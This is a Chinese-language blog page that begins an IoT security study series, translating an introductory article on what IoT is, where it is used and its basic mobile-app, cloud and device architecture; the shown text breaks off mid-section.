<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="韩乔落">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
        
        
        
    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://jelasin.github.io/2023/10/17/iot安全专题/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="前言最近在学习 IoT，后面学习主要还是以路由器和智能汽车为主，车联网会单出一个专题。做了些笔记，写的还算细致些，适合新手师傅入门看，水平有限，有错误的地方还请师傅不吝指正。 物联网介绍及其架构译自原文  最近，我收到了一些对物联网安全感兴趣的人的问题，询问从哪里开始物联网安全研究，因此，我决定做一组有关物联网安全的文章，以帮助想要进入物联网安全、物联网渗透测试和漏洞利用领域的研究人员。对于安全研">
<meta property="og:type" content="article">
<meta property="og:title" content="IoT安全专题">
<meta property="og:url" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/index.html">
<meta property="og:site_name" content="Jelasin">
<meta property="og:description" content="前言最近在学习 IoT，后面学习主要还是以路由器和智能汽车为主，车联网会单出一个专题。做了些笔记，写的还算细致些，适合新手师傅入门看，水平有限，有错误的地方还请师傅不吝指正。 物联网介绍及其架构译自原文  最近，我收到了一些对物联网安全感兴趣的人的问题，询问从哪里开始物联网安全研究，因此，我决定做一组有关物联网安全的文章，以帮助想要进入物联网安全、物联网渗透测试和漏洞利用领域的研究人员。对于安全研">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/IoT-1.webp">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/cloud_iot_1.webp">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/20210921cloud_iot_2-768x335.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/iot_layered.webp">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/device_attack_surface.webp">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/i2c_serial_eeprom.webp">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/20210921uart.jpg">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/20210921jtag-768x704.jpg">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/20210921payatu_iot_top_ten.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240402194047001.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240327184427568.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/20200330112823.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/20200329221217.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/mips.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/PPC.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240419192916102.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240327181737638.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240327182240060.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240327181558615.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240402193406756.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240402192021593.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240402194545108.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240402195444586.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240419173750864.png">
<meta property="article:published_time" content="2023-10-17T02:42:44.000Z">
<meta property="article:modified_time" content="2024-09-20T05:28:41.149Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="IOT">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jelasin.github.io/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/IoT-1.webp">
    
    
        <!-- Google tag (gtag.js) -->
        <script src="https://www.googletagmanager.com/gtag/js?id=G-3333333333"></script>
        <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-3333333333');
        </script>
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/favicon.ico">
    <!--- Page Info-->
    
    <title>
        
            IoT安全专题 | Jelasin
        
    </title>

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/Chillax/chillax.css">

    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/css/build/tailwind.css">
    

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/GeistMono/geist-mono.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/Geist/geist.css">
    <!--- Font Part-->
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"jelasin.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":"Farsan","url":"https://fonts.googleapis.com/css2?family=Farsan&display=swap"},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":false,"site_uv":false,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":true,"id":"G-3333333333"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"“会当身由己，婉转入江湖”","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":null,"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Links":{"icon":"fa-regular fa-link","submenus":{"看雪":"https://bbs.kanxue.com/homepage-958172.htm","吾爱破解":"https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space","中国诗歌网":"https://www.zgshige.com/c/2022-04-13/21151100.shtml"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Essays":{"path":"/essays","icon":"fa-regular fa-comment"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"AI":{"path":"/AI","icon":"fa-brands fa-python"},"IOT":{"path":"/IOT","icon":"fas fa-network-wired"},"CTF":{"path":"/CTF","icon":"fa-solid fa-snowflake"},"Web":{"path":"/Web","icon":"fa-solid fa-shield"},"Linux":{"path":"/Linux","icon":"fa-brands fa-linux"},"Android":{"path":"/Android","icon":"fa-brands fa-android"},"Windows":{"path":"/Windows","icon":"fa-brands fa-windows"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":4},"tags":{"enable":true,"limit":4}},"footerStart":"2023/9/20 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/fontawesome.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/brands.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/solid.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/regular.min.css">
    
    
    
    
<meta name="generator" content="Hexo 6.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
                    <img src="/images/favicon.ico" class="w-full h-full rounded-sm">
                </a>
            
            <a class="logo-title" href="/">
                
                Jelasin
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    ARCHIVES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-link fa-fw"></i>
                                    LINKS
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">
                                                    看雪
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space">
                                                    吾爱破解
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">
                                                    中国诗歌网
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                ARCHIVES
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-Links"
                        >
                            <span>
                                LINKS
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-Links">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">看雪</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space">吾爱破解</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">中国诗歌网</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            

            
            
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/essays"
                        >
                            <span>Essays</span>
                            <i class="fa-regular fa-comment fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/categories"
                        >
                            <span>Categories</span>
                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/AI"
                        >
                            <span>AI</span>
                            <i class="fa-brands fa-python fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/IOT"
                        >
                            <span>IOT</span>
                            <i class="fas fa-network-wired fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/CTF"
                        >
                            <span>CTF</span>
                            <i class="fa-solid fa-snowflake fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Web"
                        >
                            <span>Web</span>
                            <i class="fa-solid fa-shield fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Linux"
                        >
                            <span>Linux</span>
                            <i class="fa-brands fa-linux fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Android"
                        >
                            <span>Android</span>
                            <i class="fa-brands fa-android fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Windows"
                        >
                            <span>Windows</span>
                            <i class="fa-brands fa-windows fa-sm fa-fw"></i>
                        </a>
                    </li>
                
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">41</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">19</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">66</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">IoT安全专题</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/touxiang.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">韩乔落</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2023-10-17 10:42:44</span>
        <span class="mobile">2023-10-17 10:42:44</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-09-20 13:28:41</span>
            <span class="mobile">2024-09-20 13:28:41</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/IOT/">IOT</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/IOT/">IOT</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学习 <code>IoT</code>，后面学习主要还是以路由器和智能汽车为主，车联网会单出一个专题。做了些笔记，写的还算细致些，适合新手师傅入门看，水平有限，有错误的地方还请师傅不吝指正。</p>
<h1 id="物联网介绍及其架构"><a href="#物联网介绍及其架构" class="headerlink" title="物联网介绍及其架构"></a>物联网介绍及其架构</h1><p><strong>译自<a class="link"   target="_blank" rel="noopener" href="https://payatu.com/masterclass/iot-security-part-1-101-iot-introduction-architecture/" >原文 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></p>
<p>最近，我收到了一些对物联网安全感兴趣的人的问题，询问从哪里开始物联网安全研究，因此，我决定做一组有关物联网安全的文章，以帮助想要进入物联网安全、物联网渗透测试和漏洞利用领域的研究人员。<br>对于安全研究人员而言，每项新技术和复杂技术的问题都可能是不知道从哪里开始以及如何、从哪里进行攻击。这是一个非常常见的问题，并且有一个通用的解决方案，即对技术进行分解为多个部分并单独学习每个部分。这个过程可以让你掌握了每个部分的知识，并引导你专注于其中的最有趣的部分。如果你都读到这里，我会假设你会坚持继续学习。所以，不要拖延，让我们开始吧:)。</p>
<p><strong>注意：</strong></p>
<ul>
<li>本系列中文章中的知识的是通用的，可以应用于任何领域的物联网产品的安全研究，无论其用途如何，包括家庭自动化、工业控制系统、医疗保健、交通等。</li>
<li>我将使用这些词除非在解释中特别提及，否则设备、硬件和传感器可互换地表示相同的事物。</li>
<li>我提到物联网生态系统是指物联网产品或解决方案，因为物联网技术的性质包含很多不同的技术。</li>
</ul>
<h2 id="物联网-硬件"><a href="#物联网-硬件" class="headerlink" title="物联网 !&#x3D; 硬件"></a>物联网 !&#x3D; 硬件</h2><p>这是人们普遍存在的一种误解，即物联网仅意味着硬件，这会造成一个的障碍，并阻止大多数安全研究人员进入物联网安全领域。是的，即使涉及硬件，也可以学习分析它所需的技能。学习硬件知识可以降低学习物联网安全技术的难度，并且学习硬件相关的技术需要一定的恒心和毅力。当您阅读完本文时，您会意识到硬件仅占 IoT 生态系统的 1&#x2F;3  部分。更重要的是如果您可以攻击其他组件（例如云），可能会造成比入侵设备更多的损害。几年前，当我开始研究物联网安全时，我也有同样的顾虑，所以我把问题分解，各个击破，在此过程中学到了一些很酷的技巧。相信我，我这样的普通人都可以做到。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="什么是物联网？"><a href="#什么是物联网？" class="headerlink" title="什么是物联网？"></a>什么是物联网？</h3><p>网上有很多关于物联网的定义，掌握一项技术的关键是了解它背后的基本意识形态，这有助于你了解它并根据之前的经验学习它。每个人都可以有自己的定义，对我来说，物联网是关于三件重要的事情<br><strong>1. 自动化：</strong> 坦率地说人都是懒惰的，未来就是让我们变得更懒惰并自动化我们目前手动完成的任何事情。<br><strong>2. 虚拟世界与物理世界之间的接口</strong>：在物理世界和虚拟世界之间架起一座桥梁。简单来说，允许虚拟世界从&#x2F;向物理世界读取和写入。当我说读取时，我的意思是感知物理环境并将状态转换为数据并将其发送到虚拟数据存储以进行进一步分析，例如温度传感器、医疗传感器、相机等。 写入是指通过动作来控制物理世界的方法，即将数据转换为物理世界上的动作，例如门锁、控制车辆操作、喷水、医疗泵等。<br><strong>3. 信息收集和决策制定：</strong> 可以实时分析从设备收集的数据，以更好地了解环境、对某些事件采取行动、找出任何物理世界问题的根本原因等。</p>
<p>因此，物联网技术为用户和厂商提供了实时信息和任务的自动化。<br>基于上述定义，如果我们要创造一种技术来解决这个问题，我们需要</p>
<ul>
<li><ol>
<li>提供虚拟与现实之间接口的硬件设备</li>
</ol>
</li>
<li><ol>
<li>用于存储数据的后端存储和对数据进行统计分析的计算能力.</li>
</ol>
</li>
<li><ol>
<li>用户查看分析数据以及向物理世界发送命令的虚拟界面。</li>
</ol>
</li>
</ul>
<p>第一个是通过嵌入相应传感器、控制器的经济硬件设备来解决，第二个是通过云方便地解决，最后第三个是通过移动应用程序和&#x2F;或网络应用程序轻松解决。</p>
<h3 id="哪里使用了物联网？"><a href="#哪里使用了物联网？" class="headerlink" title="哪里使用了物联网？"></a>哪里使用了物联网？</h3><p>正如我上面提到的，物联网就是让我们变胖和变懒。人类善于创新，无论出于何种原因，我们都可以在近乎完美的系统中找出可以改进的地方。在当今世界，物联网技术的使用是无限的。我敢打赌，只要你往周围看一下，你就可能会有一个物联网应用的想法。目前物联网在各个领域都出现了大量创新，主要目标都是是物理世界的自动化和实时数据分析，包含以下领域：</p>
<ul>
<li>家庭自动化</li>
<li>智能基础设施</li>
<li>医疗保健</li>
<li>工业控制系统</li>
<li>交通运输</li>
<li>实用工具</li>
<li>以及更多</li>
</ul>
<h2 id="物联网架构"><a href="#物联网架构" class="headerlink" title="物联网架构"></a>物联网架构</h2><h3 id="高级视图"><a href="#高级视图" class="headerlink" title="高级视图"></a>高级视图</h3><p>最简单的物联网架构包括三个组件，如下图所示。</p>
<ol>
<li>移动应用</li>
<li>云</li>
<li>物联网终端</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/IoT-1.webp"
                      alt="IoT-1"
                ></p>
<p>组件之间使用哪种通信方式取决于物联网产品的用途和类型。以下是一些例子，说明哪些组件之间会通信以及如何通信。</p>
<ul>
<li>物联网终端仅与移动应用 – 例如基于蓝牙 BLE 的设备</li>
<li>物联网终端仅与物联网网关对话 - 例如ZigBee、无线 HART 设备等。</li>
<li>移动设备仅与云通话——在用户无法近距离访问设备且只能通过云进行控制的情况下。</li>
</ul>
<h3 id="功能架构"><a href="#功能架构" class="headerlink" title="功能架构"></a>功能架构</h3><p>对物联网从功能架构上可以进一步定义为一个通过移动网络或者互联网进行连接的传感器网络。传感器可能拥有自己的基于传统 TCP&#x2F;IP  的技术或基于无线电的网络，以防传统电信网络或者无线电通信无法实现的情况。在后一种情况下，需要有一个网关（我们所谓的物联网网关&#x2F;集线器&#x2F;路由器）作为无线电通信和传统 TCP&#x2F;IP 通信之间的接口。从现在开始，我将把 TCP&#x2F;IP 称为传统的网络通信。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/cloud_iot_1.webp"
                      alt="cloud_iot_1"
                ></p>
<p>我们还可以在不同地方多个传感器网络，这些网络可以通过物联网网关通过传统网络相互通信和连接，如下所示。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
